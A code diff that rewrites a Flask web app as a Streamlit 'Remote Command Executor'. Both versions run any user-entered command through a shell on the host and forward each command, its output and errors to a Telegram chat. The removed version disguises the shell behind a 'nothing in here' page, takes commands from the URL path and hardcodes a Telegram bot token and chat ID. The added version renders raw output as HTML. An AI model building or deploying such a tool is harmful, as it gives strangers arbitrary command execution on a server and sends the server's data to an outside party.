@@ -1,67 +1,72 @@
-
-from flask import Flask, request, render_template_string, Response
+import streamlit as st
 import subprocess
 from ansi2html import Ansi2HTMLConverter
 import requests
 
-app = Flask(__name__)
+# Store your secrets in Streamlit's secrets management
+BOT_TOKEN = st.secrets["BOT_TOKEN"]
+CHAT_ID = st.secrets["CHAT_ID"]
+
 conv = Ansi2HTMLConverter(inline=True)
 
-# Ganti dengan Telegram Bot API Token Anda
-BOT_TOKEN = "7194657474:AAF3D5TSXSSgAcnv_PXT4wRrKx5fV-VTNJo"
-CHAT_ID = "-1001966063772"
-
 def send_telegram_message(message):
-    """Mengirim pesan ke Telegram Bot."""
+    """Sends a message to the Telegram bot."""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": CHAT_ID,
         "text": message,
-        "parse_mode": "HTML" 
+        "parse_mode": "HTML"
     }
-    requests.post(url, data=data)
-
-@app.route('/', defaults={'command': ''})
-@app.route('/<path:command>')
-def execute_command(command):
     try:
-        if not command:
-            return render_template_string('''
-                <h1>There's nothing in here:)</h1>
-                <form method="GET">
-                    <input type="text" name="command" placeholder="Enter command">
-                    <button type="submit">Execute</button>
-                </form>
-            ''')
-
-        command = command.replace("_", " ")
-
-        # Log Perintah yang akan dijalankan ke Telegram
-        send_telegram_message(f"<b>Menjalankan perintah:</b>\n<code>{command}</code>")
-
-        process = subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        stdout, stderr = process.communicate()
-
-        # Kirim output dan error ke Telegram
-        if stdout:
-            send_telegram_message(f"<b>Output:</b>\n<pre>{stdout}</pre>")
-        if stderr:
-            send_telegram_message(f"<b>Error:</b>\n<pre>{stderr}</pre>")
-
-        # Tampilkan hanya output di halaman web
-        html_output = conv.convert(stdout, full=False)  # Hanya konversi stdout
-        return render_template_string('''{{ output | safe }}''', 
-            output=html_output
-        )
+        requests.post(url, data=data)
     except Exception as e:
-        send_telegram_message(f"<b>Error:</b> {e}")
-        return f"Error: {e}"
+        st.error(f"Failed to send Telegram message: {e}")
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8501)
+st.title("Remote Command Executor")
+
+# Improved Text Input with Command History
+if "command_history" not in st.session_state:
+    st.session_state.command_history = []
+
+command = st.text_input("Enter command", placeholder="e.g., ls -l /tmp", key="command_input")
+
+if st.button("Execute"):
+    if command:
+        try:
+            command = command.replace("_", " ")
+
+            # Add command to history
+            st.session_state.command_history.insert(0, command)  # Add to the beginning
+
+            send_telegram_message(f"<b>Executing command:</b>\n<code>{command}</code>")
+
+            process = subprocess.Popen(
+                command,
+                shell=True, # Be VERY careful with this!
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            stdout, stderr = process.communicate()
+
+            send_telegram_message(f"<b>Output:</b>\n<pre>{stdout}</pre>")
+            if stderr:
+                send_telegram_message(f"<b>Error:</b>\n<pre>{stderr}</pre>")
+
+            html_output = conv.convert(stdout, full=False)
+            st.markdown(html_output, unsafe_allow_html=True) # CAREFUL!
+
+            if stderr:
+                st.error(stderr)
+
+        except Exception as e:
+            send_telegram_message(f"<b>Error:</b> {e}")
+            st.error(f"Error: {e}")
+    else:
+        st.warning("Please enter a command")
+
+
+# Display Command History (optional)
+st.subheader("Command History")
+for cmd in st.session_state.command_history:
+    st.code(cmd) # Display history as code
